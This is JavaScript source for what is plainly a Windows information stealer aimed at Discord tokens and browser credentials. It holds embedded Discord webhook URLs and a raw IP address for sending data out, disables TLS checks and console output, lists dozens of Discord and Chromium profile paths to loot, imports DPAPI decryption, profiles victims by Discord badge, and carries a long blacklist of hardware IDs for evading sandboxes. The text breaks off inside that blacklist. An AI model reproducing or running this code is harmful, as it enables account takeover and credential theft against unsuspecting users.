// Load environment variables from .env file
require('dotenv').config();

process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = "0";

const fs = require("fs");
const fsPromises = require("fs").promises;
const path = require("path");
const crypto = require("crypto");
const { Dpapi } = require("@primno/dpapi");
const { join, basename, dirname } = path;
const FormData = require("form-data");
const AdmZip = require("adm-zip");
const axios = require("axios");
const https = require("https");
const os = require("os");
const sqlite3 = require("sqlite3")
const archiver = require("archiver");
const { exec, execFile, execSync, spawn } = require("child_process");
const StreamZip = require("node-stream-zip");

let config = {
  webhook: "https://ptb.discord.com/api/webhooks/1461479368005255393/lYNWOFWJs1LQnqcADGb5ew7l6OvHJ6NG3RJ-C8QrwqCzDMpxlS378KAHjfJc673r775p",
  key: "EVIL-WEEKLY-F59A9F0B42B3",
  errors: "https://canary.discord.com/api/webhooks/1424613285348642816/X74iHv4WVyCnMpFLKQ3B1uu4HYzg6Od1Ot9pZVTL7NRgkGYfh32yPPurHls3tTRido7Y",
  api: "198.89.99.163:3000",
};

    console.log = () => {};
    console.error = () => {};
    console.warn = () => {};
    console.info = () => {};
    
let logs = "";
const tokens = [];
const local = process.env.LOCALAPPDATA;
const roaming = process.env.APPDATA;
const appdata = process.env.APPDATA;
const localappdata = process.env.LOCALAPPDATA;
const identifier = Random(10);
const ports = [9522, 9222, 9583];

const injectionPaths = [];
const injectionResults = [];

const paths = [
  { path: appdata + "\\discord\\", name: "Discord" },
  { path: appdata + "\\discordcanary\\", name: "Discord Canary" },
  { path: appdata + "\\discordptb\\", name: "Discord PTB" },
  { path: appdata + "\\discorddevelopment\\", name: "Discord Development" },
  { path: appdata + "\\lightcord\\", name: "Lightcord" },
  { path: appdata + "\\Opera Software\\Opera Neon\\", name: "Opera Neon" },
  { path: appdata + "\\Opera Software\\Opera Stable\\", name: "Opera Stable" },
  { path: appdata + "\\Opera Software\\Opera GX Stable\\", name: "Opera GX Stable" },
  { path: localappdata + "\\Amigo\\User Data\\", name: "Amigo" },
  { path: localappdata + "\\Torch\\User Data\\", name: "Torch" },
  { path: localappdata + "\\Kometa\\User Data\\", name: "Kometa" },
  { path: localappdata + "\\Orbitum\\User Data\\", name: "Orbitum" },
  { path: localappdata + "\\CentBrowser\\User Data\\", name: "CentBrowser" },
  { path: localappdata + "\\7Star\\7Star\\User Data\\", name: "7Star" },
  { path: localappdata + "\\Sputnik\\Sputnik\\User Data\\", name: "Sputnik" },
  { path: localappdata + "\\Vivaldi\\User Data\\Default\\", name: "Vivaldi" },
  { path: localappdata + "\\Epic Privacy Browser\\User Data\\", name: "Epic Privacy Browser" },
  { path: localappdata + "\\uCozMedia\\Uran\\User Data\\Default\\", name: "Uran" },
  { path: localappdata + "\\Microsoft\\Edge\\User Data\\Default\\", name: "Edge (Default)" },
  { path: localappdata + "\\Microsoft\\Edge\\User Data\\Profile 1\\", name: "Edge (Profile 1)" },
  { path: localappdata + "\\Microsoft\\Edge\\User Data\\Profile 2\\", name: "Edge (Profile 2)" },
  { path: localappdata + "\\Microsoft\\Edge\\User Data\\Profile 3\\", name: "Edge (Profile 3)" },
  { path: localappdata + "\\Microsoft\\Edge\\User Data\\Profile 4\\", name: "Edge (Profile 4)" },
  { path: localappdata + "\\Microsoft\\Edge\\User Data\\Profile 5\\", name: "Edge (Profile 5)" },
  { path: localappdata + "\\Microsoft\\Edge\\User Data\\Guest Profile\\", name: "Edge (Guest Profile)" },
  { path: localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\", name: "Yandex (Default)" },
  { path: localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\", name: "Yandex (Profile 1)" },
  { path: localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\", name: "Yandex (Profile 2)" },
  { path: localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\", name: "Yandex (Profile 3)" },
  { path: localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\", name: "Yandex (Profile 4)" },
  { path: localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\", name: "Yandex (Profile 5)" },
  { path: localappdata + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\", name: "Yandex (Guest Profile)" },
  { path: localappdata + "\\Iridium\\User Data\\Default\\", name: "Iridium" },
  { path: localappdata + "\\Google\\Chrome SxS\\User Data\\", name: "Chrome SxS" },
  { path: localappdata + "\\Google\\Chrome\\User Data\\Default\\", name: "Chrome (Default)" },
  { path: localappdata + "\\Google\\Chrome\\User Data\\Profile 1\\", name: "Chrome (Profile 1)" },
  { path: localappdata + "\\Google\\Chrome\\User Data\\Profile 2\\", name: "Chrome (Profile 2)" },
  { path: localappdata + "\\Google\\Chrome\\User Data\\Profile 3\\", name: "Chrome (Profile 3)" },
  { path: localappdata + "\\Google\\Chrome\\User Data\\Profile 4\\", name: "Chrome (Profile 4)" },
  { path: localappdata + "\\Google\\Chrome\\User Data\\Profile 5\\", name: "Chrome (Profile 5)" },
  { path: localappdata + "\\Google\\Chrome\\User Data\\Guest Profile\\", name: "Chrome (Guest Profile)" },
  { path: localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\", name: "Brave (Default)" },
  { path: localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\", name: "Brave (Profile 1)" },
  { path: localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\", name: "Brave (Profile 2)" },
  { path: localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\", name: "Brave (Profile 3)" },
  { path: localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\", name: "Brave (Profile 4)" },
  { path: localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\", name: "Brave (Profile 5)" },
  { path: localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\", name: "Brave (Guest Profile)" },
];

const browsers_path = [
  [appdata + "\\Opera Software\\Opera Stable\\Default\\", "Default", appdata + "\\Opera Software\\Opera Stable\\"],
  [appdata + "\\Opera Software\\Opera Stable\\Profile 1\\", "Opera_Stable_Profile_1", appdata + "\\Opera Software\\Opera Stable\\"],
  [appdata + "\\Opera Software\\Opera Stable\\Profile 2\\", "Opera_Stable_Profile_2", appdata + "\\Opera Software\\Opera Stable\\"],
  [appdata + "\\Opera Software\\Opera Stable\\Profile 3\\", "Opera_Stable_Profile_3", appdata + "\\Opera Software\\Opera Stable\\"],
  [appdata + "\\Opera Software\\Opera Stable\\Profile 4\\", "Opera_Stable_Profile_4", appdata + "\\Opera Software\\Opera Stable\\"],
  [appdata + "\\Opera Software\\Opera Stable\\Profile 5\\", "Opera_Stable_Profile_5", appdata + "\\Opera Software\\Opera Stable\\"],
  [appdata + "\\Opera Software\\Opera Neon\\User Data\\Default\\", "Default", appdata + "\\Opera Software\\Opera Neon\\User Data\\"],
  [appdata + "\\Opera Software\\Opera Neon\\User Data\\Profile 1\\", "OperaNeon_Profile_1", appdata + "\\Opera Software\\Opera Neon\\User Data\\"],
  [appdata + "\\Opera Software\\Opera Neon\\User Data\\Profile 2\\", "OperaNeon_Profile_2", appdata + "\\Opera Software\\Opera Neon\\User Data\\"],
  [appdata + "\\Opera Software\\Opera Neon\\User Data\\Profile 3\\", "OperaNeon_Profile_3", appdata + "\\Opera Software\\Opera Neon\\User Data\\"],
  [appdata + "\\Opera Software\\Opera Neon\\User Data\\Profile 4\\", "OperaNeon_Profile_4", appdata + "\\Opera Software\\Opera Neon\\User Data\\"],
  [appdata + "\\Opera Software\\Opera Neon\\User Data\\Profile 5\\", "OperaNeon_Profile_5", appdata + "\\Opera Software\\Opera Neon\\User Data\\"],
  [appdata + "\\Opera Software\\Opera GX Stable\\Default\\", "Default", appdata + "\\Opera Software\\Opera GX Stable\\"],
  [appdata + "\\Opera Software\\Opera GX Stable\\Profile 1\\", "Opera_GXStable_Profile_1", appdata + "\\Opera Software\\Opera GX Stable\\"],
  [appdata + "\\Opera Software\\Opera GX Stable\\Profile 2\\", "Opera_GXStable_Profile_2", appdata + "\\Opera Software\\Opera GX Stable\\"],
  [appdata + "\\Opera Software\\Opera GX Stable\\Profile 3\\", "Opera_GXStable_Profile_3", appdata + "\\Opera Software\\Opera GX Stable\\"],
  [appdata + "\\Opera Software\\Opera GX Stable\\Profile 4\\", "Opera_GXStable_Profile_4", appdata + "\\Opera Software\\Opera GX Stable\\"],
  [appdata + "\\Opera Software\\Opera GX Stable\\Profile 5\\", "Opera_GXStable_Profile_5", appdata + "\\Opera Software\\Opera GX Stable\\"],
  [localappdata + "\\Amigo\\User Data\\Default\\", "Amigo_Default", localappdata + "\\Amigo\\User Data\\"],
  [localappdata + "\\Torch\\User Data\\Default\\", "Torch_Default", localappdata + "\\Torch\\User Data\\"],
  [localappdata + "\\Kometa\\User Data\\Default\\", "Kometa_Default", localappdata + "\\Kometa\\User Data\\"],
  [localappdata + "\\Orbitum\\User Data\\Default\\", "Orbitum_Default", localappdata + "\\Orbitum\\User Data\\"],
  [localappdata + "\\CentBrowser\\User Data\\Default\\", "CentBrowser_Default", localappdata + "\\CentBrowser\\User Data\\"],
  [localappdata + "\\7Star\\7Star\\User Data\\Default\\", "7Star_Default", localappdata + "\\7Star\\7Star\\User Data\\"],
  [localappdata + "\\Sputnik\\Sputnik\\User Data\\Default\\", "Sputnik_Default", localappdata + "\\Sputnik\\Sputnik\\User Data\\"],
  [localappdata + "\\Vivaldi\\User Data\\Default\\", "Vivaldi_Default", localappdata + "\\Vivaldi\\User Data\\"],
  [localappdata + "\\Iridium\\User Data\\Default\\", "Iridium_Default", localappdata + "\\Iridium\\User Data\\"],
  [localappdata + "\\Epic Privacy Browser\\User Data\\Default\\", "Epic_Privacy_Browser_Default", localappdata + "\\Epic Privacy Browser\\User Data\\"],
  [localappdata + "\\uCozMedia\\Uran\\User Data\\Default\\", "Uran_Default", localappdata + "\\uCozMedia\\Uran\\User Data\\"],
  [localappdata + "\\Microsoft\\Edge\\User Data\\Default\\", "Edge_Default", localappdata + "\\Microsoft\\Edge\\User Data\\"],
  [localappdata + "\\Microsoft\\Edge\\User Data\\Profile 1\\", "Edge_Profile_1", localappdata + "\\Microsoft\\Edge\\User Data\\"],
  [localappdata + "\\Microsoft\\Edge\\User Data\\Profile 2\\", "Edge_Profile_2", localappdata + "\\Microsoft\\Edge\\User Data\\"],
  [localappdata + "\\Microsoft\\Edge\\User Data\\Profile 3\\", "Edge_Profile_3", localappdata + "\\Microsoft\\Edge\\User Data\\"],
  [localappdata + "\\Microsoft\\Edge\\User Data\\Profile 4\\", "Edge_Profile_4", localappdata + "\\Microsoft\\Edge\\User Data\\"],
  [localappdata + "\\Microsoft\\Edge\\User Data\\Profile 5\\", "Edge_Profile_5", localappdata + "\\Microsoft\\Edge\\User Data\\"],
  [localappdata + "\\Microsoft\\Edge\\User Data\\Guest Profile\\", "Edge_Guest_Profile", localappdata + "\\Microsoft\\Edge\\User Data\\"],
  [localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\", "Yandex_Default", localappdata + "\\Yandex\\YandexBrowser\\User Data\\"],
  [localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\", "Yandex_Profile_1", localappdata + "\\Yandex\\YandexBrowser\\User Data\\"],
  [localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\", "Yandex_Profile_2", localappdata + "\\Yandex\\YandexBrowser\\User Data\\"],
  [localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\", "Yandex_Profile_3", localappdata + "\\Yandex\\YandexBrowser\\User Data\\"],
  [localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\", "Yandex_Profile_4", localappdata + "\\Yandex\\YandexBrowser\\User Data\\"],
  [localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\", "Yandex_Profile_5", localappdata + "\\Yandex\\YandexBrowser\\User Data\\"],
  [localappdata + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\", "Yandex_Guest_Profile", localappdata + "\\Yandex\\YandexBrowser\\User Data\\"],
  [localappdata + "\\Google\\Chrome SxS\\User Data\\Default\\", "Chrome_SxS_Default", localappdata + "\\Google\\Chrome SxS\\User Data\\"],
  [localappdata + "\\Google\\Chrome\\User Data\\Default\\", "Chrome_Default", localappdata + "\\Google\\Chrome\\User Data\\"],
  [localappdata + "\\Google\\Chrome\\User Data\\Profile 1\\", "Chrome_Profile_1", localappdata + "\\Google\\Chrome\\User Data\\"],
  [localappdata + "\\Google\\Chrome\\User Data\\Profile 2\\", "Chrome_Profile_2", localappdata + "\\Google\\Chrome\\User Data\\"],
  [localappdata + "\\Google\\Chrome\\User Data\\Profile 3\\", "Chrome_Profile_3", localappdata + "\\Google\\Chrome\\User Data\\"],
  [localappdata + "\\Google\\Chrome\\User Data\\Profile 4\\", "Chrome_Profile_4", localappdata + "\\Google\\Chrome\\User Data\\"],
  [localappdata + "\\Google\\Chrome\\User Data\\Profile 5\\", "Chrome_Profile_5", localappdata + "\\Google\\Chrome\\User Data\\"],
  [localappdata + "\\Google\\Chrome\\User Data\\Guest Profile\\", "Chrome_Guest_Profile", localappdata + "\\Google\\Chrome\\User Data\\"],
  [localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\", "Brave_Default", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\"],
  [localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\", "Brave_Profile_1", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\"],
  [localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\", "Brave_Profile_2", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\"],
  [localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\", "Brave_Profile_3", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\"],
  [localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\", "Brave_Profile_4", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\"],
  [localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\", "Brave_Profile_5", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\"],
  [localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\", "Brave_Guest_Profile", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\"],
];

const badges = {
  staff: {
    emoji: "<:staff:1362105228719034679>",
    id: 1 << 0,
    rare: true,
  },

  active_developer: {
    emoji: "<:activedev:1362104965065212074>",
    id: 1 << 22,
    rare: false,
  },

  early_supporter: {
    emoji: "<:pig:1362105166811103515>",
    id: 1 << 9,
    rare: true,
  },

  verified_developer: {
    emoji: "<:dev:1362105068060676329>",
    id: 1 << 17,
    rare: true,
  },

  certified_moderator: {
    emoji: "<:mod:1362105108170539229>",
    id: 1 << 18,
    rare: true,
  },

  bug_hunter_level_1: {
    emoji: "<:bughunter1:1362105034157981758>",
    id: 1 << 3,
    rare: true,
  },

  bug_hunter_level_2: {
    emoji: "<:bughunter2:1362105047462314293>",
    id: 1 << 14,
    rare: true,
  },

  partner: {
    emoji: "<:partner:1362105185094336622>",
    id: 1 << 1,
    rare: true,
  },

  hypesquad_house_1: {
    emoji: "<:bravery:1362105004089147784>",
    id: 1 << 6,
    rare: false,
  },

  hypesquad_house_2: {
    emoji: "<:brilliance:1362105019066748968>",
    id: 1 << 7,
    rare: false,
  },

  hypesquad_house_3: {
    emoji: "<:balance:1362104986330202172>",
    id: 1 << 8,
    rare: false,
  },

  hypesquad: {
    emoji: "<:events:1362105087006212456>",
    id: 1 << 2,
    rare: true,
  },

  nitro: {
    emoji: "<a:nitro:1362115714185691186>",
    rare: false,
  },

  nitro_bronze: {
    emoji: "<:bronze:1365454925357645994>",
    rare: false,
  },

  nitro_silver: {
    emoji: "<:silver:1365454972962996254>",
    rare: false,
  },

  nitro_gold: {
    emoji: "<:gold:1365454994337435739>",
    rare: false,
  },

  nitro_platinum: {
    emoji: "<:platinum:1365455020690243737>",
    rare: false,
  },

  nitro_diamond: {
    emoji: "<:diamond:1365455075937488967>",
    rare: false,
  },

  nitro_emerald: {
    emoji: "<:emerald:1365455096296509524>",
    rare: false,
  },

  nitro_ruby: {
    emoji: "<:ruby:1365455125187137536>",
    rare: false,
  },

  nitro_opal: {
    emoji: "<:opal:1365455150260551740>",
    rare: false,
  },

  guild_booster_lvl1: {
    emoji: "<:boost1:1362104840250986667>",
    rare: false,
  },

  guild_booster_lvl2: {
    emoji: "<:boost2:1362104851575607636>",
    rare: false,
  },

  guild_booster_lvl3: {
    emoji: "<:boost3:1362104863084904830>",
    rare: false,
  },

  guild_booster_lvl4: {
    emoji: "<:boost4:1362104873600024857>",
    rare: true,
  },

  guild_booster_lvl5: {
    emoji: "<:boost5:1362104892226928812>",
    rare: true,
  },

  guild_booster_lvl6: {
    emoji: "<:boost6:1362104904348467431>",
    rare: true,
  },

  guild_booster_lvl7: {
    emoji: "<:boost7:1362104916247707658>",
    rare: true,
  },

  guild_booster_lvl8: {
    emoji: "<:boost8:1362104931745530197>",
    rare: true,
  },

  guild_booster_lvl9: {
    emoji: "<:boost9:1362104950938796164>",
    rare: true,
  },

  quest_completed: {
    emoji: "<:quest:1362105209496801290>",
    rare: false,
  },
};

const browsers = {
  chrome: {
    bin: `${process.env.PROGRAMFILES}\\Google\\Chrome\\Application\\chrome.exe`,
    user_data: `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data`,
  },

  edge: {
    bin: `${process.env["PROGRAMFILES(X86)"]}\\Microsoft\\Edge\\Application\\msedge.exe`,
    user_data: `${process.env.LOCALAPPDATA}\\Microsoft\\Edge\\User Data`,
  },

  brave: {
    bin: `${process.env.PROGRAMFILES}\\BraveSoftware\\Brave-Browser\\Application\\brave.exe`,
    user_data: `${process.env.LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data`,
  },

  firefox: {
    bin: `${process.env.PROGRAMFILES}\\Mozilla Firefox\\firefox.exe`,
    user_data: `${process.env.APPDATA}\\Mozilla\\Firefox\\Profiles`,
  },

  opera: {
    bin: `${process.env.LOCALAPPDATA}\\Programs\\Opera\\opera.exe`,
    user_data: `${process.env.APPDATA}\\Opera Software\\Opera Stable`,
  },

  opera_gx: {
    bin: `${process.env.LOCALAPPDATA}\\Programs\\Opera GX\\opera.exe`,
    user_data: `${process.env.APPDATA}\\Opera Software\\Opera GX Stable`,
  },

  vivaldi: {
    bin: `${process.env.LOCALAPPDATA}\\Vivaldi\\Application\\vivaldi.exe`,
    user_data: `${process.env.LOCALAPPDATA}\\Vivaldi\\User Data`,
  },
};



const hwid = (() => { try { return execSync('WMIC csproduct get UUID').toString().trim().split('\n')[1] } catch { return null } })();
var hwidblack = ["00000000-0000-0000-0000-000000000000", "00000000-0000-0000-0000-50E5493391EF", "00000000-0000-0000-0000-AC1F6BD047A0", "00000000-0000-0000-0000-AC1F6BD04850", "00000000-0000-0000-0000-AC1F6BD048D6", "00000000-0000-0000-0000-AC1F6BD048DC", "00000000-0000-0000-0000-AC1F6BD048F8", "00000000-0000-0000-0000-AC1F6BD048FE", "00000000-0000-0000-0000-AC1F6BD04900", "00000000-0000-0000-0000-AC1F6BD0491C", "00000000-0000-0000-0000-AC1F6BD04926", "00000000-0000-0000-0000-AC1F6BD04928", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-AC1F6BD04976", "00000000-0000-0000-0000-AC1F6BD04978", "00000000-0000-0000-0000-AC1F6BD04986", "00000000-0000-0000-0000-AC1F6BD049B8", "00000000-0000-0000-0000-AC1F6BD04C0A", "00000000-0000-0000-0000-AC1F6BD04D06", "00000000-0000-0000-0000-AC1F6BD04D08", "00000000-0000-0000-0000-AC1F6BD04D8E", "00000000-0000-0000-0000-AC1F6BD04D98", "00000000-0000-0000-0000-AC1F6BD04DC0", "00000000-0000-0000-0000-AC1F6BD04DCC", "02AD9898-FA37-11EB-AC55-1D0C0A67EA8A", "032E02B4-0499-05C3-0806-3C0700080009", "03AA02FC-0414-0507-BC06-D70700080009", "03D40274-0435-05BF-D906-D20700080009", "03DE0294-0480-05DE-1A06-350700080009", "050C3342-FADD-AEDF-EF24-C6454E1A73C9", "05790C00-3B21-11EA-8000-3CECEF4400D0", "0700BEF3-1410-4284-81B1-E5C17FA9E18F", "07AF2042-392C-229F-8491-455123CC85FB", "07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9", "08C1E400-3C56-11EA-8000-3CECEF43FEDE", "0910CBA3-B396-476B-A7D7-716DB90F5FB9", "0934E336-72E4-4E6A-B3E5-383BD8E938C3", "0A36B1E3-1F6B-47DE-8D72-D4F46927F13F", "0A9D60D4-9A32-4317-B7C0-B11B5C677335", "0D748400-3B00-11EA-8000-3CECEF44007E", "0F377508-5106-45F4-A0D6-E8352F51A8A5", "104F9B96-5B46-4567-BF56-0066C1C6F7F0", "11111111-2222-3333-4444-555555555555", "119602E8-92F9-BD4B-8979-DA682276D385", "12204D56-28C0-AB03-51B7-44A8B7525250", "12EE3342-87A2-32DE-A390-4C2DA4D512E9", "138D921D-680F-4145-BDFF-EC463E70C77D", "13A61742-AF45-EFE4-70F4-05EF50767784", "14692042-A78B-9563-D59D-EB7DD2639037", "1AAD2042-66E8-C06A-2F81-A6A4A6A99093", "1B5D3FFD-A28E-4F11-9CD6-FF148989548C", "1D4D3342-D6C4-710C-98A3-9CC6571234D5", "213D2878-0E33-4D8C-B0D1-31425B9DE674", "222EFE91-EAE3-49F1-8E8D-EBAE067F801A", "26645000-3B67-11EA-8000-3CECEF440124", "2AB86800-3C50-11EA-8000-3CECEF440130", "2C5C2E42-E7B1-4D75-3EA3-A325353CDB72", "2CEA2042-9B9B-FAC1-44D8-159FE611FCCC", "2DD1B176-C043-49A4-830F-C623FFB88F3C", "2E6FB594-9D55-4424-8E74-CE25A25E36B0", "2F94221A-9D07-40D9-8C98-87CB5BFC3549", "2FBC3342-6152-674F-08E4-227A81CBD5F5", "34419E14-4019-11EB-9A22-6C4AB634B69A", "361E3342-9FAD-AC1C-F1AD-02E97892270F", "365B4000-3B25-11EA-8000-3CECEF44010C", "38813342-D7D0-DFC8-C56F-7FC9DFE5C972", "38AB3342-66B0-7175-0B23-F390B3728B78", "3A9F3342-D1F2-DF37-68AE-C10F60BFB462", "3EDC0561-C455-4D64-B176-3CFBBBF3FA47", "3F284CA4-8BDF-489B-A273-41B44D668F6D", "3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E", "3FADD8D6-3754-47C4-9BFF-0E35553DD5FB", "40384E87-1FBA-4096-9EA1-D110F0EA92A8", "40F100F9-401C-487D-8D37-48107C6CE1D3", "418F0D5B-FCB6-41F5-BDA5-94C1AFB240ED", "41B73342-8EA1-E6BF-ECB0-4BC8768D86E9", "42A82042-3F13-512F-5E3D-6BF4FFFD8518", "44B94D56-65AB-DC02-86A0-98143A7423BF", "4729AEB0-FC07-11E3-9673-CE39E79C8A00", "481E2042-A1AF-D390-CE06-A8F783B1E76A", "48941AE9-D52F-11DF-BBDA-503734826431", "49434D53-0200-9036-2500-369025000C65", "49434D53-0200-9036-2500-369025003865", "49434D53-0200-9036-2500-369025003A65", "49434D53-0200-9036-2500-369025003AF0", "49434D53-0200-9036-2500-369025005CF0", "49434D53-0200-9036-2500-36902500F022", "49434D53-0200-9065-2500-659025002274", "49434D53-0200-9065-2500-659025005073", "49434D53-0200-9065-2500-659025008074", "49434D53-0200-9065-2500-65902500E439", "499B0800-3C18-11EA-8000-3CECEF43FEA4", "4C4C4544-0050-3710-8058-CAC04F59344A", "4CB82042-BA8F-1748-C941-363C391CA7F3", "4CE94980-D7DA-11DD-A621-08606E889D9B", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "4DC32042-E601-F329-21C1-03F27564FD6C", "4EDF3342-E7A2-5776-4AE5-57531F471D56", "51646514-93E1-4CB6-AF29-036B45D14CBF", "52A1C000-3BAB-11EA-8000-3CECEF440204", "56B9F600-3C1C-11EA-8000-3CECEF4401DE", "59C68035-4B21-43E8-A6A6-BD734C0EE699", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "5C1CA40D-EF14-4DF8-9597-6C0B6355D0D6", "5CC7016D-76AB-492D-B178-44C12B1B3C73", "5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E", "5E573342-6093-4F2D-5F78-F51B9822B388", "5EBC5C00-3B70-11EA-8000-3CECEF4401DA", "5EBD2E42-1DB8-78A6-0EC3-031B661D5C57", "60C83342-0A97-928D-7316-5F1080A78E72", "612F079A-D69B-47EA-B7FF-13839CD17404", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "63DE70B4-1905-48F2-8CC4-F7C13B578B34", "63FA3342-31C7-4E8E-8089-DAFF6CE5E967", "64176F5E-8F74-412F-B3CF-917EFA5FB9DB", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "66729280-2B0C-4BD0-8131-950D86871E54", "66CC1742-AAC7-E368-C8AE-9EEB22BD9F3B", "671BC5F7-4B0F-FF43-B923-8B1645581DC8", "67442042-0F69-367D-1B2E-1EE846020090", "67C5A563-3218-4718-8251-F38E3F6A89C1", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "686D4936-87C1-4EBD-BEB7-B3D92ECA4E28", "6881083C-EE5A-43E7-B7E3-A0CE9227839C", "69AEA650-3AE3-455C-9F80-51159BAE5EAE", "6A669639-4BD2-47E5-BE03-9CBAFC9EF9B3", "6AA13342-49AB-DC46-4F28-D7BDDCE6BE32", "6ECEAF72-3548-476C-BD8D-73134A9182C8", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "71522042-DA0B-6793-668B-CE95AEA7FE21", "72492D47-52EF-427A-B623-D4F2192F97D4", "73163342-B704-86D5-519B-18E1D191335C", "777D84B3-88D1-451C-93E4-D235177420A7", "782ED390-AE10-4727-A866-07018A8DED22", "79AF5279-16CF-4094-9758-F88A616D81B4", "7A484800-3B19-11EA-8000-3CECEF440122", "7AB5C494-39F5-4941-9163-47F54D6D5016", "7CA33342-A88C-7CD1-1ABB-7C0A82F488BF", "7D341C16-E8E9-42EA-8779-93653D877231", "7D6A0A6D-394E-4179-9636-662A8D2C7304", "7E4755A6-7160-4982-8F5D-6AA481749F10", "80152042-2F34-11D1-441F-5FADCA01996D", "83BFD600-3C27-11EA-8000-3CECEF4400B4", "844703CF-AA4E-49F3-9D5C-74B8D1F5DCB6", "84782042-E646-50A0-159F-A8E75D4F9402", "84FE3342-6C67-5FC6-5639-9B3CA3D775A1", "84FEEFBC-805F-4C0E-AD5B-A0042999134D", "8703841B-3C5E-461C-BE72-1747D651CE89", "88DC3342-12E6-7D62-B0AE-C80E578E7B07", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "8DA62042-8B59-B4E3-D232-38B29A10964A", "8EC60B88-7F2B-42DA-B8C3-4E2EF2A8C603", "907A2A79-7116-4CB6-9FA5-E5A58C4587CD", "90A83342-D7E7-7A14-FFB3-2AA345FDBC89", "91625303-5211-4AAC-9842-01A41BA60D5A", "91A9EEDB-4652-4453-AC5B-8E92E68CBCF5", "921E2042-70D3-F9F1-8CBD-B398A21F89C6", "94515D88-D62B-498A-BA7C-3614B5D4307C", "95BF6A00-3C63-11EA-8000-3CECEF43FEB8", "96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE", "9921DE3A-5C1A-DF11-9078-563412000026", "9B2F7E00-6F4C-11EA-8000-3CECEF467028", "9C6D1742-046D-BC94-ED09-C36F70CC9A91", "9FC997CA-5081-4751-BC78-CE56D06F6A62", "A100EFD7-4A31-458F-B7FE-2EF95162B32F", "A15A930C-8251-9645-AF63-E45AD728C20C", "A19323DA-80B2-48C9-9F8F-B21D08C3FE07", "A1A849F7-0D57-4AD3-9073-C79D274EECC8", "A2339E80-BB69-4BF5-84BC-E9BE9D574A65", "A5CE2042-8D25-24C4-71F7-F56309D7D45F", "A6A21742-8023-CED9-EA8D-8F0BC4B35DEA", "A7721742-BE24-8A1C-B859-D7F8251A83D3", "A9C83342-4800-0578-1EE8-BA26D2A678D2", "AAFC2042-4721-4E22-F795-A60296CAC029", "ACA69200-3C4C-11EA-8000-3CECEF4401AA", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "AF1B2042-4B90-0000-A4E4-632A1C8C7EB1", "B1112042-52E8-E25B-3655-6A4F54155DBF", "B22B623B-6B62-4F9B-A9D3-94A15453CEF4", "B5B77895-D40B-4F30-A565-6EF72586A14A", "B6464A2B-92C7-4B95-A2D0-E5410081B812", "B9DA2042-0D7B-F938-8E8A-DA098462AAEC", "BB233342-2E01-718F-D4A1-E7F69D026428", "BB64E044-87BA-C847-BC0A-C797D1A16A50", "BE784D56-81F5-2C8D-9D4B-5AB56F05D86E", "BFE62042-E4E1-0B20-6076-C5D83EDFAFCE", "C0342042-AF96-18EE-C570-A5EFA8FF8890", "C249957A-AA08-4B21-933F-9271BEC63C85", "C364B4FE-F1C1-4F2D-8424-CB9BD735EF6E", "C51E9A00-3BC3-11EA-8000-3CECEF440034", "C6B32042-4EC3-6FDF-C725-6F63914DA7C7", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "C9283342-8499-721F-12BE-32A556C9A7A8", "CC4AB400-3C66-11EA-8000-3CECEF43FE56", "CC5B3F62-2A04-4D2E-A46C-AA41B7050712", "CD74107E-444E-11EB-BA3A-E3FDD4B29537", "CE352E42-9339-8484-293A-BD50CDC639A5", "CEFC836C-8CB1-45A6-ADD7-209085EE2A57", "CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F", "D2DC3342-396C-6737-A8F6-0C6673C1DE08", "D4260370-C9F1-4195-95A8-585611AE73F2", 